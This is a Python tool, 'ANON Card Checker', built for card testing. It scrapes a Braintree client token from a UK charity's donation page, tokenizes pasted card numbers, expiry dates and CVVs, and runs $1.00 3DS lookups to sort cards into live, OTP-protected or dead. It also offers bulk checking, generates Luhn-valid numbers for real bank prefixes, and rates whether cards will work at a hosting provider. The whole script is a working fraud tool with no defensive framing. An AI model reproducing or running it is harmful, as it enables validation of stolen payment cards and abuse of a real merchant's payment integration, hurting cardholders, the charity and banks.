#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════
# ANON CARD CHECKER v4.0 — BRAIN TREE 3DS2 EDITION
# Created by: anonymous | anonymous.world
# Features: Braintree 3DS2 + Stripe + BIN Lookup + Luhn + VBV Check
# Based on: cllsupport.org.uk $1.00 checker by @diwazz
# ═══════════════════════════════════════════════════════════════

import sys
import os
import re
import json
import time
import base64
import random
import requests
import threading
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from core.fx import AnonFX, fx

class AnonCardChecker:
    """MONSTER Card Checker — Braintree 3DS2 + Stripe + BIN + Luhn"""

    # 3DS Status Mapping
    STATUS_MAP = {
        "authenticate_successful": "LIVE — No OTP",
        "authenticate_attempt_successful": "LIVE — No OTP",
        "challenge_required": "OTP REQUIRED — 3DS Active",
        "authenticate_frictionless_failed": "OTP REQUIRED",
        "lookup_card_error": "OTP REQUIRED",
        "authenticate_rejected": "DECLINED",
        "lookup_error": "ERROR",
        "authenticate_unavailable": "OTP REQUIRED",
        "authenticate_error": "ERROR",
        "no_response": "DEAD — No Response",
    }

    BANK_BINS = {
        "4532": "Chase Bank", "4556": "Wells Fargo", "4000": "Visa", "4111": "Capital One",
        "4242": "Stripe Test", "4012": "Bank of America", "4988": "Barclays", "4916": "HSBC",
        "4715": "Santander", "4500": "Banco do Brasil", "4300": "Itau", "4800": "Nubank",
        "5425": "MasterCard", "5111": "Bank of America", "5200": "MasterCard", "5311": "Capital One",
        "5500": "Citi", "5555": "MasterCard", "5444": "Barclays", "5130": "BNP Paribas",
        "5300": "Santander", "5999": "Itau", "5892": "Bradesco", "3742": "Amex",
        "3782": "Amex Platinum", "3714": "Amex Gold", "3766": "Amex Business",
        "3777": "Amex Corporate", "6011": "Discover", "6012": "Discover It", "6500": "Discover Miles",
    }

    UAS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    ]

    def __init__(self):
        self.session = requests.Session()
        self.results = []
        self.lock = threading.Lock()

    def _luhn(self, card_number):
        digits = [int(d) for d in str(card_number) if d.isdigit()]
        if len(digits) < 13 or len(digits) > 19:
            return False
        odd_sum = sum(digits[-1::-2])
        even_sum = sum([sum(divmod(2 * d, 10)) for d in digits[-2::-2]])
        return (odd_sum + even_sum) % 10 == 0

    def _get_card_type(self, number):
        if number.startswith("4"): return "Visa"
        elif number.startswith(("51", "52", "53", "54", "55")): return "MasterCard"
        elif number.startswith(("34", "37")): return "Amex"
        elif number.startswith(("6011", "65")): return "Discover"
        return "Unknown"

    def _get_bank(self, number):
        for bin_len in [6, 5, 4, 3, 2]:
            prefix = number[:bin_len]
            if prefix in self.BANK_BINS:
                return self.BANK_BINS[prefix]
        return "Unknown"

    def _get_level(self, number):
        card_type = self._get_card_type(number)
        if card_type == "Visa":
            return {"4": "Classic", "5": "Gold", "6": "Platinum", "7": "Signature", "8": "Infinite"}.get(number[1], "Standard")
        elif card_type == "MasterCard":
            return {"0": "Standard", "2": "Gold", "4": "Platinum", "5": "World", "8": "World Elite"}.get(number[2], "Standard")
        elif card_type == "Amex":
            return {"0": "Green", "1": "Gold", "2": "Platinum", "3": "Centurion"}.get(number[2], "Green")
        return "Standard"

    def _generate_cc(self, prefix, length=16):
        num = prefix
        while len(num) < length - 1:
            num += str(random.randint(0, 9))
        d = [int(c) for c in num]
        odd_sum = sum(d[-1::-2])
        even_sum = sum([sum(divmod(2*x, 10)) for x in d[-2::-2]])
        check = (10 - (odd_sum + even_sum) % 10) % 10
        return num + str(check)

    def check_braintree(self, card):
        """Braintree 3DS2 Check — $1.00 auth"""
        print(fx.status("BRAINTREE 3DS2", "testing", fx.MAGENTA))

        SITE_URL = "https://cllsupport.org.uk"
        DONATE_URL = f"{SITE_URL}/donate/"
        BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
        BRAINTREE_API = "https://api.braintreegateway.com"

        HEADERS = {
            "User-Agent": random.choice(self.UAS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-GB,en;q=0.9",
        }

        s = requests.Session()
        s.headers.update(HEADERS)

        try:
            r = s.get(DONATE_URL, timeout=20)
            auth = None
            merch = None

            m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
            if not m:
                m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
            if m:
                try:
                    decoded = base64.b64decode(m.group(1)).decode("utf-8")
                    data = json.loads(decoded)
                    auth = data.get("authorizationFingerprint", "")
                    merch = data.get("merchantId", "")
                except:
                    pass

            if not auth:
                auth_m = re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', r.text)
                merch_m = re.search(r'"merchantId"\s*:\s*"([^"]+)"', r.text)
                if auth_m:
                    auth = auth_m.group(1)
                    merch = merch_m.group(1) if merch_m else "dyb5fmjx5t5wxckj"

            if not auth:
                return {"status": "ERROR", "message": "Auth extraction failed", "code": "auth_fail"}

            month, year = card["expiry"].split("/")
            if len(year) == 2: year = "20" + year

            query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
            }"""
            variables = {"input": {"creditCard": {"number": card["number"], "expirationMonth": month, "expirationYear": year, "cvv": card["cvv"]}, "options": {"validate": False}}}

            h = {**HEADERS, "Authorization": f"Bearer {auth}", "Braintree-Version": "2018-05-10", "Content-Type": "application/json"}
            body = {"clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(random.randint(100000,999999))}, "query": query, "variables": variables, "operationName": "TokenizeCreditCard"}

            resp = s.post(BRAINTREE_GRAPHQL, headers=h, json=body)
            data = resp.json()

            if "errors" in data:
                return {"status": "ERROR", "message": "Tokenization failed", "code": "token_fail"}

            token = data["data"]["tokenizeCreditCard"]["token"]
            last4 = data["data"]["tokenizeCreditCard"]["creditCard"].get("last4", "")
            brand = data["data"]["tokenizeCreditCard"]["creditCard"].get("brandCode", "VISA")

            url = f"{BRAINTREE_API}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
            payload = {
                "amount": "1.00", "browserColorDepth": 24, "browserJavaEnabled": False,
                "browserJavascriptEnabled": True, "browserLanguage": "en-GB",
                "browserScreenHeight": 800, "browserScreenWidth": 360,
                "browserTimeZone": -345, "deviceChannel": "Browser",
                "additionalInfo": {"ipAddress": "127.0.0.1", "billingLine1": "New York", "billingCity": "New York", "billingState": "NY", "billingPostalCode": "10080", "billingCountryCode": "US", "billingPhoneNumber": "998773772", "billingGivenName": "anon", "billingSurname": "user", "email": "anon@anonymous.world"},
                "bin": card["number"][:6], "dfReferenceId": f"0_{random.randint(100000,999999)}",
                "clientMetadata": {"requestedThreeDSecureVersion": "2", "sdkVersion": "web/3.115.1"},
                "authorizationFingerprint": auth, "braintreeLibraryVersion": "braintree/web/3.115.1",
            }

            resp = s.post(url, headers={**HEADERS, "Content-Type": "application/json"}, json=payload, timeout=45)
            lookup = resp.json()

            result_code = "no_response"
            try:
                result_code = lookup["paymentMethod"]["threeDSecureInfo"]["status"]
            except:
                lookup_str = json.dumps(lookup)
                for code in self.STATUS_MAP:
                    if code in lookup_str:
                        result_code = code
                        break

            status = self.STATUS_MAP.get(result_code, "Unknown")

            enrolled = "UNKNOWN"
            try:
                enrolled_raw = lookup["paymentMethod"]["threeDSecureInfo"]["enrolled"]
                if enrolled_raw == "Y": enrolled = "ENROLLED"
                elif enrolled_raw == "N": enrolled = "NOT_ENROLLED"
                elif enrolled_raw == "U": enrolled = "UNKNOWN"
            except:
                pass

            return {"status": status, "code": result_code, "enrolled": enrolled, "brand": brand, "last4": last4}

        except Exception as e:
            return {"status": "ERROR", "message": str(e), "code": "exception"}

    def check_bin(self, number):
        """BIN lookup for bank info"""
        print(fx.status("BIN LOOKUP", "testing", fx.MAGENTA))

        try:
            r = requests.get(f"https://lookup.binlist.net/{number[:6]}", timeout=8,
                           headers={"User-Agent": random.choice(self.UAS)})
            if r.status_code == 200:
                d = r.json()
                return {
                    "bank": d.get("bank", {}).get("name", ""),
                    "country": d.get("country", {}).get("name", ""),
                    "country_code": d.get("country", {}).get("alpha2", ""),
                    "scheme": d.get("scheme", ""),
                    "type": d.get("type", ""),
                    "brand": d.get("brand", ""),
                    "prepaid": d.get("prepaid", False),
                }
        except:
            pass

        return {
            "bank": self._get_bank(number),
            "country": "Unknown",
            "country_code": "",
            "scheme": self._get_card_type(number),
            "type": "",
            "brand": "",
            "prepaid": False,
        }

    def check_card(self, number, expiry, cvv):
        """Full card check — all engines"""
        result = {
            "number": number,
            "expiry": expiry,
            "cvv": cvv,
            "luhn": False,
            "card_type": "Unknown",
            "bank": "Unknown",
            "level": "Unknown",
            "bin_info": {},
            "braintree": {},
            "kamatera_ready": False,
            "kamatera_reason": "",
        }

        clean = re.sub(r'[^0-9]', '', number)
        result["number"] = clean

        result["luhn"] = self._luhn(clean)
        if not result["luhn"]:
            result["kamatera_reason"] = "Luhn check failed"
            return result

        result["card_type"] = self._get_card_type(clean)
        result["bank"] = self._get_bank(clean)
        result["level"] = self._get_level(clean)

        result["bin_info"] = self.check_bin(clean)
        if result["bin_info"].get("bank"):
            result["bank"] = result["bin_info"]["bank"]

        card_data = {"number": clean, "expiry": expiry, "cvv": cvv}
        result["braintree"] = self.check_braintree(card_data)

        if result["card_type"] in ["Visa", "MasterCard", "Amex", "Discover"]:
            if result["braintree"].get("status", "").startswith("LIVE"):
                result["kamatera_ready"] = True
                result["kamatera_reason"] = "LIVE — Should work on Kamatera"
            elif "OTP" in result["braintree"].get("status", ""):
                result["kamatera_ready"] = True
                result["kamatera_reason"] = "3DS Active — May work with OTP"
            else:
                result["kamatera_ready"] = False
                result["kamatera_reason"] = result["braintree"].get("status", "Unknown")
        else:
            result["kamatera_reason"] = f"{result['card_type']} not supported"

        return result

    def display_result(self, r):
        bt = r.get("braintree", {})
        bin_info = r.get("bin_info", {})

        status_color = fx.GREEN if r["kamatera_ready"] else fx.RED
        status_icon = "✅" if r["kamatera_ready"] else "❌"

        print(f"""
{fx.CYAN}╔══════════════════════════════════════════════════════════════════════╗{fx.RESET}
{fx.CYAN}║  {fx.YELLOW}💳 {fx.WHITE}{r['number']:<58}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║                                                                      ║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Card Type:{fx.RESET}  {fx.WHITE}{r['card_type']:<15} {fx.DIM}Level:{fx.RESET} {fx.WHITE}{r['level']:<25}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Bank:{fx.RESET}     {fx.WHITE}{r['bank']:<15} {fx.DIM}Country:{fx.RESET} {fx.WHITE}{bin_info.get('country','N/A'):<23}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Scheme:{fx.RESET}   {fx.WHITE}{bin_info.get('scheme','N/A'):<15} {fx.DIM}Prepaid:{fx.RESET} {fx.RED if bin_info.get('prepaid') else fx.GREEN}{str(bin_info.get('prepaid',False)):<24}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Luhn:{fx.RESET}     {fx.GREEN if r['luhn'] else fx.RED}{'VALID' if r['luhn'] else 'INVALID':<15} {fx.DIM}Length:{fx.RESET} {fx.GREEN}{'OK':<25}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║                                                                      ║{fx.RESET}
{fx.CYAN}║  {fx.MAGENTA}🧪 BRAINTREE 3DS2:{fx.RESET}                                                   {fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Status:{fx.RESET}   {fx.WHITE}{bt.get('status','N/A'):<50}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Code:{fx.RESET}     {fx.WHITE}{bt.get('code','N/A'):<50}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Enrolled:{fx.RESET} {fx.WHITE}{bt.get('enrolled','N/A'):<50}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Brand:{fx.RESET}    {fx.WHITE}{bt.get('brand','N/A'):<50}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║  {fx.DIM}Last4:{fx.RESET}    {fx.WHITE}{bt.get('last4','N/A'):<50}{fx.CYAN}║{fx.RESET}
{fx.CYAN}║                                                                      ║{fx.RESET}
{fx.CYAN}║  {status_color}{status_icon} KAMATERA: {r['kamatera_reason']:<49}{fx.CYAN}║{fx.RESET}
{fx.CYAN}╚══════════════════════════════════════════════════════════════════════╝{fx.RESET}
""")

    def menu(self):
        while True:
            print(fx.box(" ANON CARD CHECKER v4.0 — 3DS2 EDITION ", fx.CYAN, 75, "double"))
            print()
            print(f"  {fx.GREEN}[1]{fx.RESET} {fx.BOLD}CHECK SINGLE{fx.RESET} {fx.DIM}— Full check with Braintree 3DS2{fx.RESET}")
            print(f"  {fx.GREEN}[2]{fx.RESET} {fx.BOLD}CHECK BULK{fx.RESET} {fx.DIM}— Multiple cards{fx.RESET}")
            print(f"  {fx.GREEN}[3]{fx.RESET} {fx.BOLD}GENERATE TEST{fx.RESET} {fx.DIM}— Create test cards{fx.RESET}")
            print(f"  {fx.GREEN}[4]{fx.RESET} {fx.BOLD}KAMATERA CHECK{fx.RESET} {fx.DIM}— Check Kamatera compatibility{fx.RESET}")
            print(f"  {fx.RED}[0]{fx.RESET} {fx.BOLD}EXIT{fx.RESET}")
            print()
            print(fx.box("", fx.DIM, 75, "single"))

            choice = input(f"{fx.CYAN}checker>{fx.RESET} {fx.WHITE}").strip()
            print(fx.RESET)

            if choice == "1":
                print(f"{fx.YELLOW}Format: CARD|MM|YY|CVV{fx.RESET}")
                ci = input(f"{fx.CYAN}Card: {fx.WHITE}").strip()
                if ci:
                    p = ci.split("|")
                    if len(p) >= 4:
                        number = p[0].strip().replace(" ", "").replace("-", "")
                        mm = p[1].strip().zfill(2)
                        yy = p[2].strip()
                        cvv = p[3].strip()
                        expiry = f"{mm}/{yy[-2:]}"

                        fx.spinner(1, "Checking")
                        result = self.check_card(number, expiry, cvv)
                        self.display_result(result)

            elif choice == "2":
                print(f"{fx.YELLOW}Paste cards (CARD|MM|YY|CVV), blank line to finish:{fx.RESET}")
                cards = []
                while True:
                    line = input().strip()
                    if not line:
                        break
                    cards.append(line)

                for card_line in cards:
                    p = card_line.split("|")
                    if len(p) >= 4:
                        number = p[0].strip().replace(" ", "").replace("-", "")
                        mm = p[1].strip().zfill(2)
                        yy = p[2].strip()
                        cvv = p[3].strip()
                        expiry = f"{mm}/{yy[-2:]}"
                        result = self.check_card(number, expiry, cvv)
                        self.display_result(result)
                        time.sleep(1)

            elif choice == "3":
                print(f"{fx.purple_gradient('═══ GENERATING TEST CARDS ═══')}\n")
                prefixes = [
                    ("4532", "Visa", 16, "Chase Bank"),
                    ("4556", "Visa", 16, "Wells Fargo"),
                    ("4111", "Visa", 16, "Capital One"),
                    ("5425", "MasterCard", 16, "MasterCard"),
                    ("5111", "MasterCard", 16, "Bank of America"),
                    ("3742", "Amex", 15, "Amex"),
                    ("3782", "Amex", 15, "Amex Platinum"),
                    ("6011", "Discover", 16, "Discover"),
                ]

                for prefix, ctype, length, bank in prefixes:
                    cc = self._generate_cc(prefix, length)
                    month = random.randint(1, 12)
                    year = random.randint(25, 28)
                    expiry = f"{month:02d}/{year}"
                    cvv = str(random.randint(1000, 9999)) if length == 15 else str(random.randint(100, 999))

                    result = self.check_card(cc, expiry, cvv)
                    self.display_result(result)
                    time.sleep(0.5)

            elif choice == "4":
                print(f"{fx.YELLOW}Kamatera compatibility check:{fx.RESET}")
                print(f"{fx.DIM}Format: CARD|MM|YY|CVV{fx.RESET}")
                ci = input(f"{fx.CYAN}Card: {fx.WHITE}").strip()
                if ci:
                    p = ci.split("|")
                    if len(p) >= 4:
                        number = p[0].strip().replace(" ", "").replace("-", "")
                        mm = p[1].strip().zfill(2)
                        yy = p[2].strip()
                        cvv = p[3].strip()
                        expiry = f"{mm}/{yy[-2:]}"

                        result = self.check_card(number, expiry, cvv)
                        self.display_result(result)

            elif choice == "0":
                print(f"{fx.RED}💀 Checker offline. Sab chhod, system tod. 🕳️{fx.RESET}")
                break

            else:
                print(f"{fx.RED}❌ Invalid choice!{fx.RESET}")

            input(f"\n{fx.DIM}Press ENTER to continue...{fx.RESET}")
            os.system('clear')


def main():
    import argparse
    parser = argparse.ArgumentParser(description="ANON Card Checker v4.0")
    parser.add_argument("--check", "-c", type=str, help="Check single card (CARD|MM|YY|CVV)")
    args = parser.parse_args()

    checker = AnonCardChecker()

    if args.check:
        p = args.check.split("|")
        if len(p) >= 4:
            number = p[0].strip().replace(" ", "").replace("-", "")
            mm = p[1].strip().zfill(2)
            yy = p[2].strip()
            cvv = p[3].strip()
            expiry = f"{mm}/{yy[-2:]}"
            result = checker.check_card(number, expiry, cvv)
            checker.display_result(result)
    else:
        checker.menu()


if __name__ == "__main__":
    main()
